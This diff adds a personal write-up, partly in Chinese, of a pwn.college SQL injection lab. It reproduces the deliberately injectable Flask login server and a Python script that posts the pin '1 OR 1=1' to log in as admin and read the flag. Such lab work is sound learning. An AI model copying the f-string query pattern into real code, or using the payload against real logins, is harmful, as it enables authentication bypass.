@@ -1,0 +1,114 @@
+#SQLi 1
+#挑战简介
+Of course, these sorts of security gaps abound! For example, in this level, the specification of the logged in user is actually secure. 
+Instead of get parameters or raw cookies, this level uses an encrypted session cookie that you will not be able to mess with. 
+Thus, your task is to get the application to actually authenticate you as admin!
+
+Luckily, as the name of the level suggests, this application is vulnerable to a SQL injection. A SQL injection, conceptually, is to SQL what a Command Injection is to the shell. 
+In Command Injections, the application assembled a command string, 
+and a gap between the developer's intent and the command shell's actual functionality enabled attackers to carry out actions unintended by the attacker. A SQL injection is the same: 
+the developer builds the application to make SQL queries for certain goals, but because of the way these queries are assembled by the application logic, 
+the resulting actions of the SQL query, when executed by the database, can be disastrous from a security perspective.
+
+Command injections don't have a clear solution: the shell is an ancient piece of technology, and the interfaces to the shell have ossified decades ago and are very hard to change. 
+SQL is somewhat more nimble, and most databases now provide interfaces that are very resistant to being SQL-injectible. In fact, the authentication bypass levels used such interfaces: 
+they are very vulnerable, but not to SQL injection.
+
+This level, on the other hand, is SQL injectible, as it purposefully uses a slightly different way to make SQL queries. 
+When you find the SQL query into which you can inject your input (hint: it is the only SQL query to substantially differ between this level and the previous level), 
+look at what the query looks like right now, and what unintended conditions you might inject. 
+The quintessential SQL injection adds a condition so that an application can succeed without knowing the password. How can you accomplish this?
+
+#cat /challenge/server
+#!/opt/pwn.college/python
+
+import tempfile
+import sqlite3
+import random
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+db = TemporaryDB()
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")
+
+@app.route("/", methods=["POST"])
+def challenge_post():
+    username = flask.request.form.get("username")
+    pin = flask.request.form.get("pin")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not pin:
+        flask.abort(400, "Missing `pin` form parameter")
+    
+    if pin[0] not in "0123456789":
+        flask.abort(400, "Invalid pin")
+
+    try:
+        # https://www.sqlite.org/lang_select.html
+        query = f'SELECT rowid, * FROM users WHERE username = "{username}" AND pin = {pin}'
+        print(f"DEBUG: {query=}")
+        user = db.execute(query).fetchone()
+    except sqlite3.Error as e:
+        flask.abort(500, f"Query: {query}\nError: {e}")
+
+    if not user:
+        flask.abort(403, "Invalid username or pin")
+
+    flask.session["user"] = username
+    return flask.redirect(flask.request.path)
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    if not (username := flask.session.get("user", None)):
+        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
+    else:
+        page = f"<html><body>Hello, {username}!"
+        if username == "admin":
+            page += "<br>Here is your flag: " + open("/flag").read()
+
+    return page + """
+        <hr>
+        <form method=post>
+        User:<input type=text name=username>PIN:<input type=text name=pin><input type=submit value=Submit>
+        </form>
+        </body></html>
+    """
+
+app.secret_key = os.urandom(8)
+port = 8080 if os.geteuid() else 80
+app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
+app.run("challenge.localhost", port)
+
+#研究了好久，发现这道题需要用POST而不是GET，用了好久GET，才从discord那发现不需要用GET。
+#POST这边也有问题，不能用curl，curl —X POST请求的结果不支持重定向，所以它会显示
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.  //并未得到flag
+
+#所以这边考虑用python POST请求，支持重定向，创建python脚本，来访问。
+#!/usr/bin/python3.8
+import requests
+
+url = "http://challenge.localhost/"
+data = {"username":"admin","pin":"1 OR 1=1"}  //不要忘了这是SQL注入，学过SQL语法的都知道，pin码是随机的，所以我们要让他保持真值，就用到 'pin=1 OR 1=1'其中1=1是真值，OR是取两者为真值的结果
+res = requests.post(url=url,data=data)
+print(res.text)
